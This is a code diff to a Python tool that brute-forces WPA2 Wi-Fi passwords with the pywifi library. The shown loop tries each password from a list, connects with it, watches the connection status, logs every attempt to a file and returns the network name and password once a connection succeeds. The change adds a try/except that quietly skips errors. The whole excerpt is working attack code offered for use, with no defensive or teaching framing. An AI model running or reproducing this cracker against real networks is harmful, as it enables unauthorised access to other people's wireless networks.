@@ -110,38 +110,41 @@ def test(i ,face,x,key,ts):
     print(ran + "Trying to connect to wifi "+str(wifi_name))
 
     for n,password in enumerate(key):
-        if wifi_name+"--"+password in found:
-            print(r + "Password already found +_+")
+        try:
+            if wifi_name+"--"+password in found:
+                print(r + "Password already found +_+")
 
+                continue
+            else:
+                with open("already_tried_password" , "a") as f:
+                    f.write(str(wifi_name)+"--"+str(password)+"\n")
+            tried.append(str(wifi_name)+"--"+str(password))
+            print(f"{ran}Trying password {r}{str(password)} {c}{str(n)} / {g}{str(len(key))}")
+
+            profile = pywifi.Profile()
+            profile.ssid = wifi_name
+            profile.auth = const.AUTH_ALG_OPEN
+            profile.akm.append(const.AKM_TYPE_WPA2PSK)
+            profile.cipher = const.CIPHER_TYPE_CCMP
+            profile.key = password
+            # Remove all hotspot configurations
+            face.remove_all_network_profiles()
+            tmp_profile = face.add_network_profile(profile)
+            face.connect(tmp_profile)
+            code = 10
+            t1 = time.time()
+            # Cyclic refresh status, if set to 0, the password is wrong, if timeout, proceed to the next
+            while code != 0:
+                time.sleep(0.1)
+                code = face.status()
+                now = time.time() - t1
+                if now > ts:
+                    break
+                if code == 4:
+                    face.disconnect()
+                    return str(wifi_name) + "--" + str(password)
+        except Exception as e:
             continue
-        else:
-            with open("already_tried_password" , "a") as f:
-                f.write(str(wifi_name)+"--"+str(password)+"\n")
-        tried.append(str(wifi_name)+"--"+str(password))
-        print(f"{ran}Trying password {r}{str(password)} {c}{str(n)} / {g}{str(len(key))}")
-
-        profile = pywifi.Profile()
-        profile.ssid = wifi_name
-        profile.auth = const.AUTH_ALG_OPEN
-        profile.akm.append(const.AKM_TYPE_WPA2PSK)
-        profile.cipher = const.CIPHER_TYPE_CCMP
-        profile.key = password
-        # Remove all hotspot configurations
-        face.remove_all_network_profiles()
-        tmp_profile = face.add_network_profile(profile)
-        face.connect(tmp_profile)
-        code = 10
-        t1 = time.time()
-        # Cyclic refresh status, if set to 0, the password is wrong, if timeout, proceed to the next
-        while code != 0:
-            time.sleep(0.1)
-            code = face.status()
-            now = time.time() - t1
-            if now > ts:
-                break
-            if code == 4:
-                face.disconnect()
-                return str(wifi_name) + "--" + str(password)
     return False
 
 cont = ""
